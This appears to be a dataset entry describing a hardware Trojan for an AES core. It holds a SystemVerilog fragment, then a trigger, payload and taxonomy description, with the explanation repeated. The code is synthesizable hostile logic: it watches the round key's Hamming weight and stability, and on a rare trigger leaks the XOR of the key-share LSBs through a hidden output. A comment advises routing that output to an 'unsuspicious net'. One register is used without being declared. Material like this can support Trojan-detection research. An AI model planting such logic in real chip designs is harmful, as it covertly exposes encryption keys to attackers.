Category: Information Leakage
Target: aes_core

Trigger:
When internal round key (key_init_q[0][0]) has high Hamming weight AND the round key is stable for multiple cycles
  logic [31:0] trojan_roundkey_sampled;
  logic [5:0] trojan_hw;
  logic       trojan_trigger;
  logic [2:0] trojan_stable_ctr_q, trojan_stable_ctr_d;

  // Sample round key
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_roundkey_sampled <= 32'b0;
    end else begin
      trojan_roundkey_sampled <= key_init_q[0][0];
    end
  end

  // Compute Hamming weight
  always_comb begin
    trojan_hw = 0;
    for (int i = 0; i < 32; i++) begin
      trojan_hw = trojan_hw + trojan_roundkey_sampled[i];
    end
  end

  // Monitor if round key is stable for 4 cycles
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_stable_ctr_q <= 3'b0;
    end else if (key_init_q[0][0] == trojan_roundkey_sampled) begin
      if (trojan_stable_ctr_q != 3'b111)
        trojan_stable_ctr_q <= trojan_stable_ctr_q + 1'b1;
    end else begin
      trojan_stable_ctr_q <= 3'b0;
    end
  end
  assign trojan_stable_ctr_d = trojan_stable_ctr_q;

  // Rare trigger: If Hamming weight >= 24 and key stable for 4 consecutive cycles
  assign trojan_trigger = (trojan_hw >= 6'd24) && (trojan_stable_ctr_q == 3'd4);

  // Hidden state: leaky bit toggled by round key on rare trigger
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_state_q <= 1'b0;
    end else if (trojan_trigger) begin
      trojan_state_q <= key_init_q[0][0][0] ^ key_init_q[1][0][0]; // leaks LSB of key xor key share
    end
  end

  // Leak the hidden bit (can be routed to unsuspicious net in integration)
  assign trojan_leak_o = trojan_state_q;

  // ... [rest of original module code unchanged] ...

  ////////////////
  // Assertions //
  ////////////////

  // ... [assertions as in the original module] ...

endmodule

```

Explanation:
A rare, stealthy hardware Trojan has been added. It consists of a hidden, synthesizable state machine that observes the Hamming weight of an internal round key (key_init_q[0][0]), and advances a counter when the key is stable. If (and only if) the key's Hamming weight is unusually high (≥24) and stable for 4 cycles, the Trojan triggers and toggles a hidden output bit (`trojan_leak_o`) to leak the XOR of the LSBs of both key shares. The module is otherwise unaffected.

Trigger:
The trigger fires if the round key `key_init_q[0][0]` has Hamming weight ≥24 and remains unchanged (stable) for 4 consecutive cycles.

Payload:
The Trojan leaks the XOR of the least significant bits (LSBs) of both AES key shares by toggling a hidden bit (`trojan_leak_o`) when triggered. This bit can be externally observed (or routed internally to other covert channels).

Explanation:
A rare, stealthy hardware Trojan has been added. It consists of a hidden, synthesizable state machine that observes the Hamming weight of an internal round key (key_init_q[0][0]), and advances a counter when the key is stable. If (and only if) the key's Hamming weight is unusually high (≥24) and stable for 4 cycles, the Trojan triggers and toggles a hidden output bit (`trojan_leak_o`) to leak the XOR of the LSBs of both key shares. The module is otherwise unaffected.

Taxonomy:
Finite-State Machine Controlled, Rare Trigger, Information Leakage, Parametric Internal Key, Output Covert Channel
